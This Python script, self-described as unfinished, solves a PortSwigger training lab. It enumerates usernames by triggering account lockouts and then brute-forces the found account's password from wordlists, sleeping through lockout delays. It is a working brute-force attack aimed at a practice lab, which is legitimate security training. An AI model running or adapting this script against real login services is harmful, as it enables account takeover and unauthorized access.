'''



PROGRAM NOT FINISHED



'''



# A simple python program made to solve the following PortSwigger Lab:
# https://portswigger.net/web-security/authentication/password-based/lab-username-enumeration-via-account-lock

# Basic Logic Used In Program:

# <p class="is-warning">You have made too many incorrect login attempts. Please try again in 1 minute(s).</p>

import sys
import time
import requests

SCHEME = "HTTPS://"
URL = "web-security-academy.net"
PATH = "/login"
SUB_DOMAIN = "" # Change This Line With Labs Subdomain
FULL_PATH = SCHEME + SUB_DOMAIN + "." + URL + PATH
USERNAME_FILE = "../../Word-Lists/username-wordlist.txt"
PASSWORD_FILE = "../../Word-Lists/password-wordlist.txt"
FAKE_PASSWORD = "fakepassword"
ERROR_MESSAGE = "Invalid username or password."
NUMBER_OF_REQUESTS = 5

def load_file_lines(file_name):
    try:
        print(f"Loading {file_name}...")
        array = []
        with open(file_name, 'r') as file:
            for line in file:
                array.append(line.strip())
        return array
    except FileNotFoundError:
        print(f"Error: File '{file_name}' not found.")
    return None

def send_http_post(username, password):
    DATA = {"username": username, "password": password}
    RESPONSE = requests.post(FULL_PATH, data = DATA)
    print(f"{username}:{password} --> {RESPONSE.status_code}")
    return RESPONSE

def find_password(username, passwords):
    for password in passwords:
        RESPONSE = send_http_post(username, password)
        HTML = RESPONSE.text
        if ERROR_MESSAGE not in HTML:
            if "Please try again in 1 minute(s)." in RESPONSE.text:
                time.sleep(60)
            else:
                return password
    return None

def find_username(usernames):
    for username in usernames:
        for i in range(NUMBER_OF_REQUESTS):
            RESPONSE = send_http_post(username, FAKE_PASSWORD)
            if ERROR_MESSAGE not in RESPONSE.text:
                return username
    return None

def main():
    print(f"Program Starting... Target URL: {FULL_PATH}")
    USERNAMES = load_file_lines(USERNAME_FILE)
    PASSWORDS = load_file_lines(PASSWORD_FILE)
    if USERNAMES is None:
        print(f"Something went wrong trying to load file: {USERNAME_FILE}")
        sys.exit(1)
    if PASSWORDS is None:
        print(f"Something went wrong trying to load file: {PASSWORD_FILE}")
        sys.exit(1)
    USERNAME = find_username(USERNAMES)
    if USERNAME is None:
        print(f"Could Not Find Username...")
        sys.exit(1)
    PASSWORD = find_password(USERNAME, PASSWORDS)
    if PASSWORD is None:
        print(f"Could Not Find Password For {USERNAME}")
        sys.exit(1)
    print(f"Possible Set Of Credentials Found: {USERNAME}:{PASSWORD}")
    return 0

if __name__ == "__main__":
    main()
